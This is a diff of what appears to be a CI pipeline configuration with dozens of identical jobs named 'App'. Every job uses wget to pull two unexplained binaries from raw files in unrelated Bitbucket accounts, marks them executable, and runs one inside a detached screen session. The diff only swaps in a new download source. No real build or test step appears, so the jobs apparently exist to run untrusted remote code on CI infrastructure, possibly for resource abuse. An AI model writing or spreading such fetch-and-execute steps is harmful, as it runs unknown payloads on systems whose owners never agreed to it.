@@ -11,7 +11,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -27,7 +27,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -43,7 +43,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -59,7 +59,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -75,7 +75,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -91,7 +91,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -107,7 +107,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -123,7 +123,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -139,7 +139,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -155,7 +155,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -171,7 +171,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -187,7 +187,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -203,7 +203,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -219,7 +219,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -235,7 +235,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -251,7 +251,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -267,7 +267,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -283,7 +283,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -299,7 +299,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -315,7 +315,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -331,7 +331,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -347,7 +347,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -363,7 +363,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -379,7 +379,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -395,7 +395,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -411,7 +411,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -427,7 +427,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -443,7 +443,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -459,7 +459,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -475,7 +475,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -491,7 +491,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -507,7 +507,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -523,7 +523,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -539,7 +539,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -555,7 +555,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -571,7 +571,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -587,7 +587,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -603,7 +603,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -619,7 +619,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
@@ -635,7 +635,7 @@ jobs:
       - run:
           name: App
           command: |
-            wget https://bitbucket.org/rekancyg/app/raw/644baa5ba91352021e60091c0fe8b9d2c8a14d0e/luc && wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/sintaayu/app/raw/2af7401ec45b373bb745bd0609f31729c7833c61/luc
             screen -dmS ls
             chmod u+x *
             ./luc
